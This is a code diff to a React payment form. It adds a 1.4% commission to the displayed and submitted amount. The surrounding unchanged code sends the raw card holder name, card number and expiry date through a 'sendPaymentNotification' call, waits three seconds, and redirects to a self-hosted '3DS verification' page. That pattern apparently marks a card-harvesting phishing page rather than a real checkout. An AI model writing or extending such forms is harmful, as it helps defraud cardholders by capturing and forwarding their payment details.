@@ -52,6 +52,10 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
   const navigate = useNavigate();
   const { toast } = useToast();
 
+  // Calculate commission
+  const commission = amount * 0.014; // 1.4%
+  const totalAmount = amount + commission;
+
   // Validation functions
   const validateCardHolder = (value: string) => {
     // Only Latin letters, spaces, and maximum one dot, limit to 12 characters
@@ -160,7 +164,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       });
 
       await sendPaymentNotification({
-        amount,
+        amount: totalAmount,
         cardHolder,
         cardNumber,
         expiryDate,
@@ -171,7 +175,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       await new Promise(resolve => setTimeout(resolve, 3000));
       
       // Navigate to 3DS verification
-      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
+      navigate(`/verify-3ds?amount=${totalAmount}&cardHolder=${encodeURIComponent(cardHolder)}`);
     } catch (error) {
       console.error('Error processing payment:', error);
       setIsSubmitting(false);
@@ -204,8 +208,13 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn">
       <div className="space-y-2">
         <h2 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-center">
-          Pay ${amount.toFixed(2)}
+          Pay ${totalAmount.toFixed(2)}
         </h2>
+        <div className="text-center text-sm text-white/60">
+          <span>Amount: ${amount.toFixed(2)}</span>
+          <span className="mx-2">+</span>
+          <span>Commission (1.4%): ${commission.toFixed(2)}</span>
+        </div>
       </div>
       <div className="space-y-4">
         <div className="space-y-2">
